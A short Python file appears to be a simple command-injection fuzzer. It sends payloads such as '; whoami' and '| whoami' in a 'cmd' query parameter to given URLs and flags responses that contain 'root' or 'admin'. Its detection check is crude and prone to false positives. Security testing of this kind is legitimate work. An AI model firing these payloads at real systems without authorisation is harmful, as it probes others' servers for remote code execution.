import requests

class RCEFuzzer:
    def __init__(self):
        self.name = "Remote Code Execution Fuzzer"
        self.payloads = [
            "; whoami",
            "| whoami",
            "`whoami`",
            "& ls -la"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                response = self.send_request(target, payload)
                results[f"{target} ({payload})"] = response
        return results

    def send_request(self, url, payload):
        try:
            response = requests.get(f"{url}?cmd={payload}", timeout=5)
            if "root" in response.text or "admin" in response.text:
                return "VULNERABLE"
            return "SAFE"
        except requests.exceptions.RequestException:
            return "ERROR"
